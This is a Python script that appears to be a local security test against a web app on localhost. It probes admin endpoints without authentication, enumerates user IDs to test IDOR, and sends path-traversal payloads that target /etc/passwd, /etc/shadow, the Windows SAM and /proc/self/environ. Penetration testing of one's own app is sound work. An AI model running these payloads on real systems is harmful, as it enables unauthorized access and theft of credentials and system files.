#!/usr/bin/env python3
"""
Privilege Escalation Attack Simulation
Tests broken access control and privilege escalation
"""

import requests
import time

BASE_URL = "http://localhost:3001"

def test_admin_access_without_auth():
    """Test accessing admin endpoints without authentication"""
    print("🔓 Testing Admin Access Without Authentication...")
    print(f"Target: {BASE_URL}/api/admin/*\n")
    
    admin_endpoints = [
        "/api/admin/users",
        "/api/admin/export",
        "/api/admin/logs"
    ]
    
    for endpoint in admin_endpoints:
        try:
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                timeout=5
            )
            
            print(f"Endpoint: {endpoint}")
            print(f"   Status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"   ⚠️  PRIVILEGE ESCALATION: Unauthorized access!")
                print(f"   Response: {str(response.json())[:100]}...")
            elif response.status_code == 401:
                print(f"   ✅ Properly protected")
            else:
                print(f"   Status: {response.status_code}")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

def test_idor():
    """Test Insecure Direct Object Reference"""
    print("\n🆔 Testing IDOR (Insecure Direct Object Reference)...")
    print(f"Target: {BASE_URL}/api/users?id=PAYLOAD\n")
    
    # Try to access different user IDs
    user_ids = ["1", "2", "3", "admin", "root", "999999"]
    
    for user_id in user_ids:
        try:
            response = requests.get(
                f"{BASE_URL}/api/users",
                params={"id": user_id},
                timeout=5
            )
            
            print(f"User ID: {user_id}")
            print(f"   Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                if "user" in data:
                    print(f"   ⚠️  IDOR: Accessed user data without authorization!")
                    print(f"   Email: {data['user'].get('email', 'N/A')}")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

def test_lfi():
    """Test Local File Inclusion"""
    print("\n📁 Testing LFI (Local File Inclusion)...")
    print(f"Target: {BASE_URL}/api/admin/export?file=PAYLOAD\n")
    
    lfi_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../etc/hosts",
        "../../../proc/self/environ",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "users.csv",
        "../../../etc/shadow",
        "../../../var/log/apache2/access.log"
    ]
    
    for payload in lfi_payloads:
        try:
            response = requests.get(
                f"{BASE_URL}/api/admin/export",
                params={"file": payload},
                timeout=5
            )
            
            print(f"Payload: {payload}")
            print(f"   Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                print(f"   ⚠️  LFI: File access attempted!")
                print(f"   Response: {str(data)[:100]}...")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

if __name__ == "__main__":
    test_admin_access_without_auth()
    test_idor()
    test_lfi()
    print("\n✅ Privilege escalation tests completed")
